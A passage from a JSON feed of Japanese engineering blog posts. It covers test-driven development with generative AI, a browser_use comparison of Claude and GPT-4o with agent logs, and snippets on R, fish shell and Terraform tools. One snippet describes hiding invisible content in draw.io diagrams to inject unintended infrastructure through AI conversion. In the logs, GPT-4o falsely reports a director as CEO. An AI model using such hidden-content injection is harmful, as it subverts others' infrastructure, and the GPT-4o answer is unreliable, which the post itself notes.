Jeffriesのこの簡潔な言葉が、テスト駆動開発（TDD）のゴールだ。動作するきれいなコードはあらゆる意味で価値がある「動作する」と「きれい」の2つの要素に分解すると、ソフトウェア開発においては以下の4つの象限が考えられます：きれいで動作する（理想）きれいだが動作しない（机上の空論）きたないが動作する（現実の妥協）きたなくて動作しない（最悪の状態）Kent Beckは、この目標に対して、天才的なプログラマならすぐに到達できるかもしれないが、一般のプログラマはすぐには書けないと述べています。そこで彼は分割統治法を提案し、まず「動作する」ことを優先し、その後「きれい」にすることを推奨しています。テスト駆動開発作者:ＫｅｎｔＢｅｃｋオーム社Amazon生成AIとテスト駆動開発の融合ソフトウェア開発における三種の神器t-wada氏の講演では、ソフトウェア開発において欠かせない三つの技術的な柱（三種の神器）が紹介されています。これらは生成AIと協働する際にも極めて重要な基盤となります。1. バージョン管理（Version Control）バージョン管理は、人間の記憶力の限界を補うために生まれました。バージョン管理システムは：いつ、誰が、どのような変更をしたかを記録異なるバージョン間の差分を可視化複数の開発者が同時に作業することを可能に過去の状態に簡単に戻れる安全網を提供生成AIとの協働においても、AIが生成したコードを適切に管理し、問題が生じた場合に以前の状態に戻れるようにするためにバージョン管理は不可欠です。2. テスティング（Testing）テスティングは人間の把握力の限界を補います。システムが複雑化するにつれ、変更が他の部分に与える影響を人間が完全に把握することは困難になります。テスティングにより：コードが予期通りに動作することを自動的に検証変更によるリグレッションを早期に発見設計の問題点を可視化リファクタリングの安全網を提供生成AIとの協業では、この安全網がさらに重要となります。AIが生成したコードが本当に要件を満たしているかを客観的に評価するためのテストは不可欠です。3. 自動化（Automation）自動化は人間の忍耐力の限界を補います。自動化により：繰り返し作業を機械に任せることで人間のエラーを減少開発プロセスの一貫性と再現性を確保開発速度の向上と時間の節約継続的インテグレーション・継続的デリバリ（CI/CD）を実現特に重要なのは、自動化がソフトウェア開発におけるガードレールとしての役割です。AIが生成したコードの品質、セキュリティ、パフォーマンスを自動的に検証することで、AIの「創造性」と「安全性」のバランスを取ることができます。三種の神器は、「あれば便利」という加点法ではなく、「なければ危険」という減点法の世界です。生成AI時代においても、これらの基盤があってこそ、安全かつ効率的な開発が可能になります。AIとの協業進化段階AIによる開発支援は、自動車の自動運転レベルに似た段階を経て進化しています：レベル0：AI支援なし - 従来の手動開発レベル1：AI支援（Chat） - LLMによる情報提供のみレベル2：AI支援（補完＋Chat） - GitHub Copilotなどの部分的補完レベル3：Agent（人間が支援） - AIが主に作業し、人間が確認・修正レベル4：Agent（人間の支援なし） - AIが自律的に開発レベル5：業務の完全自動化 - 要求からプロセス全体を自動生成2025年の開発環境は、主にレベル3〜4の間で推移しており、「副操縦士（Copilot）」から「操縦士（Pilot）」へと主役が交代しつつあります。生成AIの強みと限界生成AIの特性は以下のようにまとめられます：強み:膨大なコードパターンとベストプラクティスの学習自然言語からコードを生成する能力環境情報を参照し、実行結果から学習して修正する能力圧倒的な速度でのコード生成・実行・修正多言語・多フレームワークへの対応多様な実装アプローチの提案能力限界:ビジネスロジックやドメイン知識の理解が浅いコンテキストの保持と長期的な一貫性の維持が苦手複雑なコンパイラ制約がある言語での実装に課題「テストを無理に通そうとする」傾向参照の明示的な解決が苦手特にCLINEなどの環境統合型エージェントは、実行と修正のサイクルを驚くべき速度で回すことができ、「どんなエキスパートでも勝てないレベル」に達しつつあります。AIツールを使いこなすためには、「コンテキストを記述する能力」「ドメインを記述する能力」「AIの性能に対する直感」といった新しいスキルセットが求められます。zenn.devドライバー席を譲った後の新しい役割開発者が主導権（ドライバー席）をAIに譲った後、どのような新しい役割を担うべきでしょうか。助手席のナビゲーター最も有望なポジションは「助手席」です：AIに対して適切な指示と方向性を提供する生成された成果物の品質と整合性を評価するAIの能力を最大限に引き出すプロンプトエンジニアリングを行う後部座席への後退リスク一方で、単に「後部座席」に座り、AIの決定に従うだけの受動的な立場になるリスクも存在します：AIが示した選択肢から選ぶだけの存在に専門的理解が浅くなり、本質的な問題解決能力が衰える「運試し」と「結果責任」だけが残される状態 speakerdeck.comこの比喩はとても好きなので将来的には「お前は後部座席に座るなよ」とか言いそう。レッドボックスの内に対処する生成AIの発展に伴い、小説「BEATLESS」で描かれた「人類未到産物（レッドボックス）」の概念が現実味を帯びてきています。「超高度AIが生み出した、今の人類には理解できない超高度技術によってつくられた産物。「レッドボックス」という名称には、観測者から遠ざかる光が赤方偏移により赤から黒（赤外領域）へと変わるように、人類が必死に追いすがらなければいずれ遠ざかりブラックボックスになってしまうという意味が込められている。」現在のAIコーディングでも、AIが生成した複雑なコードや設計に対して、人間が「理解できない」状態に陥るリスクが現実化しつつあります。それらには以下のような対策が考えられます。意図的な単純化 - AIに「人間が理解できるようなシンプルな実装」を明示的に要求する解説の要求 - 実装だけでなく、その設計思想や動作原理の解説を求める段階的な理解 - 複雑な実装を小さな部分に分解して理解するテストによる挙動の可視化 - 振る舞いを詳細なテストで定義することで、ブラックボックス化を防ぐ継続的な学習 - AIが使用する最新の技術やパターンを人間側も学び続ける speakerdeck.comAIの能力が人間の理解を超えた「レッドボックス」となっても、その内部を理解するための努力を怠らないことが、「助手席」の位置を維持するために不可欠です。技術が人間から遠ざかっていくのを防ぐために、テスト駆動開発のような体系的なアプローチが重要な役割を果たします。ＢＥＡＴＬＥＳＳ 上 (角川文庫)作者:長谷 敏司KADOKAWAAmazonバイブス労働とAIコーディングバイブスコーディングとは何かAndrej Karpathy（OpenAI共同創業者）が提唱した\\"vibe coding\\"という概念が注目を集めています。「新しい種類のコーディングがあって、私はこれを\\"vibe coding\\"と呼んでいます。そこでは完全に\\"vibe（雰囲気、直感）\\"に身を任せ、指数関数的成長を歓迎し、コードそのものが存在していることさえ忘れてしまいます。」— Andrej Karpathyこのバイブスコーディングは、以下の特徴を持っています：自力で成果物を作り込まない - AIに指示を出すことに集中ノールックマージ - AIの提案を直感的に受け入れるエラー解決のアウトソース - 問題発生時にAIに解決を依頼理詰めな部分はAIに任せる - 人間は直感と判断に集中Andrej Karpathyが提唱する「バイブスコーディング」の考え方を適度に取り入れることで、生成AIとの協業をより効果的にできます。直感を大切に - AIとの対話では、時に論理的思考よりも直感が良い結果を生むことがある反復の高速化 - AIがエラー修正や実装変更を高速で行える特性を活かし、試行錯誤のサイクルを加速余分な労力の削減 - 自明な実装や定型コードの作成はAIに任せ、本質的な部分に集中創造的提案の受け入れ - AIが提案する予想外のアプローチに対してオープンな姿勢を持つただし、バイブスに任せすぎることなく、テストという客観的基準を常に維持することで、「ノリ」と「品質」の両立を図ります。特に、重要な意思決定やアーキテクチャに関わる部分では、専門知識に基づく判断を優先しましょう。blog.lai.soバイブス労働の広がりバイブスコーディングの概念は、プログラミングの領域を超えて様々な知識労働にも応用できる「バイブス労働」という新たなパラダイムを生み出しています。バイブス労働では、AIを活用して直感的かつ効率的に成果を生み出す働き方が可能になります。バイブス労働の特徴には以下のようなものがあります：プロンプトクラフティング - AIに適切な指示を出すスキルが新たな専門性として価値を持つ創造的監督 - 細部の実装よりも、全体の方向性や品質の判断に人間の能力を集中させる反復と共進化 - 人間とAIが互いにフィードバックを与え合いながら成果物を進化させていくメタ認知の重要性 - 自分の思考プロセスを客観視し、AIとの協業に最適な役割分担を模索するバイブス労働の時代においては、「コードを書く」「文章を作成する」といった直接的な生産活動よりも、「何を作るべきか」「どのような価値を提供するか」という本質的な問いに答えることにより多くの時間とエネルギーを費やすことが可能になります。これにより、人間の創造性と直感が最大限に発揮される新しい働き方が実現するでしょう。生成AIとのテスト駆動開発の実践テスト駆動開発（TDD）の基本サイクル「Red-Green-Refactoring」を生成AIと組み合わせると、以下のようなアプローチが考えられます：Red: AIを活用したテスト設計生成AIはこのステップで：ユーザーストーリーや仕様から、テストケースを提案自然言語からテストコードを生成人間が見落としがちなエッジケースを発見様々なテスト方法を提示人間は機能要件を明確に定義し、AIが提案するテストケースが要件を正確に反映しているか評価します。Green: AIによる実装の高速化生成AIはここで：失敗するテストを満たす実装コードを生成複数の実装アプローチを提案素早いプロトタイピングを実現テスト失敗時のデバッグを支援テストという明確な基準があるため、AIの出力の正確性を客観的に評価できます。Kent Beckの原則通り、まずはテストを通過することを優先し、きれいさは次のステップで追求します。Refactoring: AIと共にコードをきれいにするこのステップでは、生成AIは：コードの問題点や改善点を指摘し、リファクタリング案を提示適切なデザインパターンを提案命名、構造、コメントなどの品質向上策を提案パフォーマンス最適化を提案テストが引き続き成功することを確認しながら、コードの品質を向上させます。AIはコードの「きれいさ」に関する豊富な知識を持っていますが、プロジェクト固有の規約やアーキテクチャの理解には限界があるため、人間による最終確認が不可欠です。Tidy First? ―個人で実践する経験主義的ソフトウェア設計作者:Kent Beckオーム社Amazon生成AIとTDDの相性の良さ生成AIとテスト駆動開発には、以下のような相性の良さがあります：明確な評価基準 - テストがAIの出力の正確性を評価する客観的基準となる繰り返しのフィードバック - 小さなサイクルによる継続的改善がAIとの協業に適している段階的な複雑性の増加 - 単純から複雑へ進むアプローチがAIの能力を引き出す品質保証の自動化 - テストによる安全網でAIコードの品質を保証責任の分担 - 人間がテストで要件を明確にし、AIが実装を担当という自然な役割分担人間の尺度のリファクタリング - AIが生成した複雑なコードを、TDDを通じて人間が理解・保守しやすい形に整理できるプログラマー脳 ～優れたプログラマーになるための認知科学に基づくアプローチ作者:フェリエンヌ・ヘルマンス,水野貴明,水野いずみ秀和システムAmazon効果的な生成AI活用のためのプラクティス1. テスト優先の指示AIに実装を依頼する前にテストを先に書くよう指示することで、テスト駆動の流れを維持します。テストを通じて機能要件を明確に定義し、AIがその要件を正確に理解することを促します。2. 段階的な複雑性の増加単純なテストケースから始め、徐々に複雑なケースを追加していくアプローチがAIとの協業に効果的です。AIが問題を段階的に理解し、複雑性を徐々に取り入れることができます。3. リファクタリングの明示的な依頼具体的なリファクタリングの観点（命名の改善、重複の排除、可読性向上など）を指定すると良い結果が得られます。焦点を絞ることでAIはより的確な改善提案ができます。4. 小さなサイクルの維持小さな機能単位でテスト→実装→リファクタリングのサイクルを回すことで、問題発生時の影響範囲を限定し、修正を容易にします。短いサイクルは、AIにとっても理解しやすく、効率的な協業を促進します。5. 三種の神器を活用したAI協業ワークフローバージョン管理:AIが生成したコードを適切にコミットし、変更履歴を明確に残すAIの提案ごとにブランチを作成して比較検討問題発生時に以前の状態に容易に戻れるよう準備テスティング:先にテストコードを作成し、明確な目標を設定テストと実装の両方を継続的に改善テストカバレッジをモニタリングして品質保証自動化:CIパイプラインでAIコードの品質を自動検証静的解析とセキュリティスキャンでAIの盲点をカバー自動化されたガードレールで意図しない問題を防止三種の神器は、AIとの協業における品質と安全性を保証する基盤となります。6. 私が生成AIの時代にRustを選択する理由プログラミングRust 第2版作者:Jim Blandy,Jason Orendorff,Leonora F. S. TindallオライリージャパンAmazonテスト駆動開発は効果的ですが、テストだけではすべての不具合を検出できないという限界があります。特に生成AI時代において、型システムによる形式検証を提供するRustのような言語を選択することで、AIとの協業をより確実なものにできます。Rustの型システムは「軽量な形式検証」として機能し、テストでは捉えきれない問題を発見します。所有権と借用チェッカーによるメモリ安全性の数学的保証、代数的データ型による未定義状態の排除、トレイト境界によるコードの整合性の静的検証など、多くの利点があります。現時点では、生成AIがRustコードを一発でコンパイル通過させることは難しく、私の経験上も何度か修正が必要になることが多いです。しかし、これは欠点というよりも、Rustのコンパイラが持つ厳格なチェック機能が「ガードレール」として働いている証拠と言えるでしょう。AIが生成したコードでもコンパイラが厳密な検証を行うことで、多くの潜在的な問題が実行前に排除されます。Rustの型システムとテスト駆動開発は相互補完的な関係にあります。型システムがコード全体の整合性と安全性を保証し、テストがビジネスロジックの正確さを検証します。このような組み合わせにより、AIが生成したコードの品質担保と不具合検出の両面をカバーできます。テストだけでは見つけられない並行処理やメモリの問題も、Rustのコンパイラが捕捉してくれるのです。生成AI時代において、言語自体が提供する安全性保証は、人間のレビュー負担を軽減し、AIとの効率的な協業を実現します。コンパイラが通過するまでに何度か調整が必要でも、その過程自体がコードの品質向上に貢献していることを忘れてはなりません。ＲｕｓｔによるＷｅｂアプリケーション開発　設計からリリース・運用まで (ＫＳ情報科学専門書)作者:豊田優貴,松本健太郎,吉川哲史講談社Amazonおわりに生成AIとテスト駆動開発を組み合わせることで、「動作するきれいなコード」を効率的に実現できる可能性が広がっています。AIの創造性と生産性、人間の判断力と創造性を組み合わせるための鍵は、テスト駆動開発の原則と三種の神器という堅固な基盤です。t-wada氏の言葉を借りれば、「テスト駆動開発は、設計のひらめきが正しい瞬間に訪れることを保証するものではない。しかし、自信を与えてくれるテストときちんと手入れされたコードは、ひらめきへの備えであり、いざひらめいたときに、それを具現化するための備えでもある」のです。t-wada.hatenablog.jp生成AIはこの「備え」をより強固にする強力なパートナーとなります。AIとの協業においても、テスト駆動開発の原則を守りながら、AIの能力を最大限に活用することで、より良いソフトウェア開発が実現できるでしょう。","isoDate":"2025-03-19T11:10:25.000Z","dateMiliSeconds":1742382625000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"uvでbrowser_useを使用した環境構築したり比べたりするけど責任は取れない。","link":"https://syu-m-5151.hatenablog.com/entry/2025/03/19/131957","contentSnippet":"はじめに三寒四温（さんかんしおん）というような天気が続いています。これは「三日寒くて四日温かい」という意味で、冬から春への移行期によく見られる気温の周期的な変動を表す言葉です。寒暖の差が激しいこの季節、AIに関しての情報収集よりみなさんが暖かい格好して体調崩さないほうが大切です。とはいえ、技術ブログなので技術的なことも書いていきます。今回はPythonのAI用ブラウザである「browser_use」ライブラリを使用して、AnthropicのClaude 3.5 SonnetとOpenAIのGPT-4oの情報収集能力を実際のコードとログで比較します。github.com実際になにかに使う場合にはドキュメントを読んで下さい。このブログはそのようなことに耐えられるように作られてはいません。docs.browser-use.com環境構築まず、uvを使って環境を構築します。uvはPythonの高速パッケージマネージャーで、依存関係の解決と仮想環境の構築が効率的に行えます。# 仮想環境を作成uv venv# 仮想環境を有効化（macOS/Linux）source .venv/bin/activate# 必要なライブラリをインストールuv pip install langchain-anthropic langchain-openai browser-use実装コードAnthropicのClaudeを使用するコード（3shake_ceo_anthropic.py）:import asynciofrom browser_use import Agentfrom langchain_anthropic import ChatAnthropicllm = ChatAnthropic(model_name=\\"claude-3-5-sonnet-latest\\")task = \\"株式会社スリーシェイクのCEOのXアカウントを教えて下さい\\"agent = Agent(    task=task,    llm=llm,)async def main():    await agent.run()asyncio.run(main())OpenAIのGPT-4oを使用するコード（3shake_ceo_openai.py）:import asynciofrom browser_use import Agentfrom langchain_openai import ChatOpenAIllm = ChatOpenAI(model=\\"gpt-4o\\")task = \\"株式会社スリーシェイクのCEOのXアカウントを教えて下さい\\"agent = Agent(    task=task,    llm=llm,)async def main():    await agent.run()asyncio.run(main())実行結果(uv run xx.py)Claude 3.5 Sonnet（Anthropic）の実行ログINFO     [browser_use] BrowserUse logging setup complete with level infoINFO     [root] Anonymized telemetry enabled. See https://docs.browser-use.com/development/telemetry for more information.INFO     [agent] \uD83D\uDE80 Starting task: 株式会社スリーシェイクのCEOのXアカウントを教えて下さいINFO     [agent] \uD83D\uDCCD Step 1INFO     [agent] \uD83E\uDD37 Eval: Unknown - Starting fresh with empty pageINFO     [agent] \uD83E\uDDE0 Memory: Starting the task to find X (Twitter) account of 株式会社スリーシェイク\'s CEO. Step 1/100.INFO     [agent] \uD83C\uDFAF Next goal: Search for 株式会社スリーシェイク company information on GoogleINFO     [agent] \uD83D\uDEE0️  Action 1/1: {\\"search_google\\":{\\"query\\":\\"株式会社スリーシェイク CEO Twitter X\\"}}INFO     [controller] \uD83D\uDD0D  Searched for \\"株式会社スリーシェイク CEO Twitter X\\" in GoogleINFO     [agent] \uD83D\uDCCD Step 2INFO     [agent] \uD83D\uDC4D Eval: Success - Found search results showing the CEO\'s X accountINFO     [agent] \uD83E\uDDE0 Memory: Found that the CEO of スリーシェイク is 吉田拓真 (Takuma Yoshida) and his X account is @taqqma_ikachan. Step 2/100.INFO     [agent] \uD83C\uDFAF Next goal: Visit the CEO\'s X profile to confirm informationINFO     [agent] \uD83D\uDEE0️  Action 1/1: {\\"click_element\\":{\\"index\\":19}}INFO     [controller] \uD83D\uDDB1️  Clicked button with index 19: 吉田 拓真 / スリーシェイク (@taqqma_ikachan) / XINFO     [agent] \uD83D\uDCCD Step 3INFO     [agent] \uD83D\uDC4D Eval: Success - I have confirmed that this is indeed the X account of the CEO of スリーシェイクINFO     [agent] \uD83E\uDDE0 Memory: Found and confirmed that 吉田拓真 (Yoshida Takuma) is the CEO of スリーシェイク and his X account is @taqqma_ikachan. His profile confirms he is the 代表取締役社長 (CEO) of スリーシェイク.INFO     [agent] \uD83C\uDFAF Next goal: Task completed - provide the answerINFO     [agent] \uD83D\uDEE0️  Action 1/1: {\\"done\\":{\\"text\\":\\"株式会社スリーシェイクのCEOのXアカウントは @taqqma_ikachan です。\\",\\"success\\":true}}INFO     [agent] \uD83D\uDCC4 Result: 株式会社スリーシェイクのCEOのXアカウントは @taqqma_ikachan です。INFO     [agent] ✅ Task completedINFO     [agent] ✅ SuccessfullyGPT-4o（OpenAI）の実行ログINFO     [browser_use] BrowserUse logging setup complete with level infoINFO     [root] Anonymized telemetry enabled. See https://docs.browser-use.com/development/telemetry for more information.INFO     [agent] \uD83D\uDE80 Starting task: 株式会社スリーシェイクのCEOのXアカウントを教えて下さいINFO     [agent] \uD83D\uDCCD Step 1INFO     [agent] \uD83E\uDD37 Eval: Unknown - The page is empty and there\'s no previous context to evaluate.INFO     [agent] \uD83E\uDDE0 Memory: Need to find the X account of 株式会社スリーシェイク\'s CEO.INFO     [agent] \uD83C\uDFAF Next goal: Search for 株式会社スリーシェイク CEO Twitter account on Google.INFO     [agent] \uD83D\uDEE0️  Action 1/1: {\\"search_google\\":{\\"query\\":\\"株式会社スリーシェイク CEO Twitter account\\"}}INFO     [controller] \uD83D\uDD0D  Searched for \\"株式会社スリーシェイク CEO Twitter account\\" in GoogleINFO     [agent] \uD83D\uDCCD Step 2INFO     [agent] \uD83D\uDC4D Eval: Success - Google search is displaying links related to the CEO of 株式会社スリーシェイク and their X account.INFO     [agent] \uD83E\uDDE0 Memory: Searching for 株式会社スリーシェイク CEO\'s Twitter account. Found potential link at index 26.INFO     [agent] \uD83C\uDFAF Next goal: Check the link at index 26 to verify if it leads to the CEO\'s X account.INFO     [agent] \uD83D\uDEE0️  Action 1/1: {\\"click_element\\":{\\"index\\":26}}INFO     [controller] \uD83D\uDDB1️  Clicked button with index 26: 株式会社スリーシェイク (@3shake_Inc) / XINFO     [agent] \uD83D\uDCCD Step 3INFO     [agent] ⚠ Eval: Failed - The page requires login to access the X account information.INFO     [agent] \uD83E\uDDE0 Memory: Currently on the login page of X; unable to access 株式会社スリーシェイク\'s CEO account information directly without logging in.INFO     [agent] \uD83C\uDFAF Next goal: Search again for 株式会社スリーシェイク\'s CEO X account from another source.INFO     [agent] \uD83D\uDEE0️  Action 1/1: {\\"search_google\\":{\\"query\\":\\"株式会社スリーシェイク CEO X account\\"}}INFO     [controller] \uD83D\uDD0D  Searched for \\"株式会社スリーシェイク CEO X account\\" in GoogleINFO     [agent] \uD83D\uDCCD Step 4INFO     [agent] \uD83D\uDC4D Eval: Success - Found a link that likely refers to the CEO\'s X account.INFO     [agent] \uD83E\uDDE0 Memory: Trying to access 株式会社スリーシェイク CEO\'s X account via the link available at index 25.INFO     [agent] \uD83C\uDFAF Next goal: Click on the link at index 25 to verify if it leads to the CEO\'s X account.INFO     [agent] \uD83D\uDEE0️  Action 1/1: {\\"click_element\\":{\\"index\\":25}}INFO     [controller] \uD83D\uDDB1️  Clicked button with index 25: 内村一行/3-Shake (@KAZUYUKIUCHIMU) / XINFO     [agent] \uD83D\uDCCD Step 5INFO     [agent] \uD83D\uDC4D Eval: Success - Reached the login page for the user\'s X account.INFO     [agent] \uD83E\uDDE0 Memory: Identified the CEO\'s Twitter handle as @KAZUYUKIUCHIMU, but login is required to access more information.INFO     [agent] \uD83C\uDFAF Next goal: Provide the CEO\'s X account and complete the task.INFO     [agent] \uD83D\uDEE0️  Action 1/1: {\\"done\\":{\\"text\\":\\"The CEO of 株式会社スリーシェイク, 内村一行, has an X account with the handle @KAZUYUKIUCHIMU.\\",\\"success\\":true}}INFO     [agent] \uD83D\uDCC4 Result: The CEO of 株式会社スリーシェイク, 内村一行, has an X account with the handle @KAZUYUKIUCHIMU.INFO     [agent] ✅ Task completedINFO     [agent] ✅ Successfullyコードとログの詳細分析browser_useの動作browser_useライブラリは、AIモデルをWebブラウジングと組み合わせて情報検索を行うエージェントを作成します。このライブラリはログを詳細に記録しており、AIの意思決定プロセスを追跡できます：\uD83D\uDE80 Starting task: タスクの開始\uD83D\uDCCD Step N: 各ステップの開始\uD83E\uDD37 Eval: ページの状態評価\uD83E\uDDE0 Memory: AIのタスク理解と記憶\uD83C\uDFAF Next goal: 次の目標設定\uD83D\uDEE0️ Action: 実行するアクション\uD83D\uDCC4 Result: 最終結果モデル間の違い1. 検索クエリの違いClaude: 株式会社スリーシェイク CEO Twitter XGPT-4o: 株式会社スリーシェイク CEO Twitter accountこの微妙な違いが、初期の検索結果に影響しました。2. 問題解決アプローチの違いGPT-4oは会社の公式アカウント（@3shake_Inc）をまず確認しようとしましたが、ログイン要求に遭遇して別の戦略に切り替えました。一方、Claudeは直接CEOのアカウントを検索してアクセスしました。3. 情報確認の徹底度Claudeはプロフィールにアクセスして「代表取締役社長」の肩書きを確認しましたが、GPT-4oは内村一行氏（実際は取締役）をCEOと誤認したままでした。技術的考察browser_useの利点詳細なログ: browser_useは各ステップを詳細にログに記録するため、AIの判断プロセスを追跡できます。シンプルなAPI: わずか数行のコードでAIエージェントを作成でき、異なるモデルの比較テストが容易です。多様なモデルサポート: browser_useは複数のAIモデルをサポートしており、異なるモデル間の比較が容易です。docs.browser-use.com改善ポイントログから以下の改善点が考えられます：1.検索クエリの最適化# より精度の高いクエリを指定task = \\"株式会社スリーシェイク 吉田拓真 CEO Xアカウント\\"2. 複数情報源からの検証agent = Agent(    task=task,    llm=llm,    verify_sources=True,  # 複数ソースでの検証を促す（仮想的なパラメータ）)3. エラー時の代替戦略# ログイン画面に遭遇した場合の対処を明示的に指示agent = Agent(    task=task,    llm=llm,    login_strategy=\\"search_alternative\\",  # ログイン要求時の戦略)実務への応用AIエージェントを活用する際は、以下の点に注意すると良いでしょう：1. 正確なプロンプトの設計# より具体的なタスク指定task = \\"株式会社スリーシェイクの代表取締役社長/CEOの公式Xアカウントを会社の公式情報から特定してください\\"2. 複数モデルでの検証# 複数モデルの結果を比較results = {}for model_name in [\\"claude-3-5-sonnet-latest\\", \\"gpt-4o\\"]:    agent = create_agent_for_model(model_name)    results[model_name] = await agent.run()# 結果の一致度を確認compare_results(results)3. 結果の人間によるレビュー:特に重要な意思決定には、AIの判断をそのまま信頼するのではなく、人間による最終チェックを行うプロセスを組み込むことが重要です。結果に責任が取れるような仕組みにはまだなっていなさそうです。テスト的になにかのチェックを行わせるというのは必要かと思いました。まとめ今回の実験では、特別なプロンプトエンジニアリングやチューニングを一切行わず、同じコードで二つのモデルを実行した結果を比較しました。思いつきで雑に実行しただけなのに、興味深い違いが出てきたのは面白いポイントです。Claudeは正確にCEOを特定した一方、GPT-4oは取締役を誤ってCEOと判断しました。この結果は、AIエージェントがまだ完璧ではなく、特に重要な情報収集には複数の検証プロセスを設けることの重要性を示しています。今後も気軽に試せるツールとして、browser_useとuvの組み合わせは便利そうです。特に複雑な設定や調整をしなくても、こうした比較実験が簡単にできるのが魅力的です。docs.browser-use.com注：コード例は概念的なものであり、実際のbrowser_use APIとは異なる場合があります。詳細は公式ドキュメントを参照してください。","isoDate":"2025-03-19T04:19:57.000Z","dateMiliSeconds":1742357997000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Rでトレースバックつきのエラーログをとる","link":"https://blog.atusy.net/2025/03/19/log-error-on-r/","contentSnippet":"エラーログはエラーでユーザーに影響が発生した時に、何が起きたか記録する重要な情報源です。特にどこで問題が起きたか特定を容易にするトレースバックはログに欠かせません。ログをとらなくてもエラーは表示されるよと思いの方も、ログを使うとエラーの発生時刻は関連情報を同時に記録できるので、覚えていて損はないです。","isoDate":"2025-03-19T00:00:00.000Z","dateMiliSeconds":1742342400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Fishで非同期処理を実装してみる","link":"https://blog.atusy.net/2025/03/16/fish-async/","contentSnippet":"Fishのプロンプトを自作していて、実行に時間がかかる場合に、非同期にプロンプトを更新できるか気になりました。軽く調べてみたところ、ユニバーサル変数を利用するといいよとのこと。","isoDate":"2025-03-16T00:00:00.000Z","dateMiliSeconds":1742083200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"外向けに話すときは相手のメリットを話そう","link":"https://nnaka2992.hatenablog.com/entry/2025/03/14/204148","contentSnippet":"お仕事をしているとチームや自分の周りで合意を取ったことを、相手にお願いしに行くことが多々あります。例えばピープルマネジメントのマネージャー層でxxというやり方を試していきたいと合意をとったものを、相手にお願いしに行くこと。例えば自分たちの担当範囲の決め事で、相手に協力をお願いしに行くこと。例えば自分たちのシステムと他システム間の決め事で、こちらの方針を相談しに行くこと。自分たちの決め事を相手に協力してもらうことはよくあります。方針を固めるまでにディスカッションを重ね、自分たちにどのようなメリットがあるかは詳細に話すでしょう。自分たちの考えやメリットも詳細に説明できるでしょう。では相手のメリットはどうでしょう？ 自分の考えやメリットの説明で終わってはいないでしょうか？相手のアクションが必要なとき、ポジションティブに動いてもらうには相手の動機が重要です。相手にメリット考えて貰うより、発案者から提案したほうが心象も良くなります。要は相手の立場を考えましょうの一側面です。相手と話すときは相手の立場を考えましょう。","isoDate":"2025-03-14T11:41:48.000Z","dateMiliSeconds":1741952508000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"ObservabilityCON on the Road Tokyo 2025 Recap","link":"https://sreake.com/blog/observabilitycon-on-the-road-tokyo-2025-recap/","contentSnippet":"はじめに Sreake事業部の岩﨑です。 2025年2月25日、ObservabilityCON on the Road Tokyo 2025 が東京ポートシティ竹芝で開催されました。初めての参加でしたが、Grafana […]The post ObservabilityCON on the Road Tokyo 2025 Recap first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-03-14T02:09:01.000Z","dateMiliSeconds":1741918141000,"authorName":"Sreake","authorId":"Sreake"},{"title":"1～100までの整数が奇数かどうかを判定するプログラム.R","link":"https://blog.atusy.net/2025/03/14/is-odd-r/","contentSnippet":"【ゆる募】１～100までの整数が奇数かどうかを判定するプログラム大喜利を開催します☺　言語不問✨https://x.com/arith_rose/status/1899300131658510802とのことで、Rで書いてみましょう。模範解答……？ナニソレオイシイノ？","isoDate":"2025-03-14T00:00:00.000Z","dateMiliSeconds":1741910400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"fish shellを実質的なデフォルトシェルにするbashrc","link":"https://blog.atusy.net/2025/03/13/drop-into-fish-from-bash/","contentSnippet":"fish shell、便利ですよね。デフォルトでもシンタックスハイライトや補完がよく効いてチューニングしなくてもそこそこ高速に起動するので日常使いしています。これまで chsh -s /usr/bin/fish してデフォルトシェルにfish shellを指定していましたが、Nixやhome-manager経由でfish shellを入れると特殊な場所にインストールされるため、chshできない問題に遭遇しました。","isoDate":"2025-03-13T00:00:00.000Z","dateMiliSeconds":1741824000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Infrastructure Designing Injection ~ draw.ioに対して ~","link":"https://zenn.dev/akasan/articles/66d1fc03edde50","contentSnippet":"Infrastructure Designing Injectionとは私が勝手に適当に思いついたものになります。業務の中で「Terraformで書いた構成をdraw.ioで図にしてくれると嬉しいよね」みたいなコメントがあり、その逆もできるんだろうなと思っていました。その時、もしdraw.ioの中に目には見えない情報を仕組んだら予期せぬ構成を作成させることができるのでは？と思い、それってInjectionだよねということで命名しました。Infrastructure Designing Injectionと書くと長いのでIDIと呼ばせてくださいw※ IDIというよりステガノ...","isoDate":"2025-03-12T14:38:56.000Z","dateMiliSeconds":1741790336000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"Neovim Nightlyでターミナル内でプロンプト間をジャンプできるようになった（OSC133）","link":"https://blog.atusy.net/2025/03/12/nvim-osc133/","contentSnippet":"Vim駅伝2025-03-12の記事です。最近、NeovimがOSC 133に対応しました（https://github.com/neovim/neovim/pull/32736）。これにより、OSC 133に対応したシェルのユーザーであれば、[[ や ]] を使って、:terminal内のシェルプロンプト間をジャンプできるようになります。","isoDate":"2025-03-12T00:00:00.000Z","dateMiliSeconds":1741737600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Google CloudのTerraform職人が失職する機能が出てしまった……","link":"https://zenn.dev/nnaka2992/articles/intro_to_application_design_center","contentSnippet":"Google CloudがApplication Design Centerという、構成図を書けばTerraformを書いて、デプロイまで行う機能をリリースしました。[1]https://cloud.google.com/application-design-center/docs/overviewどうやらGoogle CloudはTerraform職人を失職に追い込みたいようです。 Application Design Centerの概要アプリケーション デザイン センターは、Google Cloud アプリケーション インフラストラクチャの設計、共有、デプロイに役立ちます...","isoDate":"2025-03-11T00:30:01.000Z","dateMiliSeconds":1741653001000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"tfmcp \uD83E\uDD80: A Rust-Implemented Tool to Operate Terraform from LLMs","link":"https://syu-m-5151.hatenablog.com/entry/2025/03/10/091144","contentSnippet":"IntroductionHello! Today, I\'d like to introduce a tool I recently developed called tfmcp. This tool allows you to operate Terraform from LLMs (Large Language Models) by utilizing the Model Context Protocol (MCP).github.comIf you like this project, please consider giving a Star to the GitHub repository to encourage development. Feedback is always welcome!What is MCP?Before diving in, let me briefly explain MCP (Model Context Protocol). For more detailed information, refer to the official documentation at modelcontextprotocol.io.Note: The image above is in Japanese but illustrates the 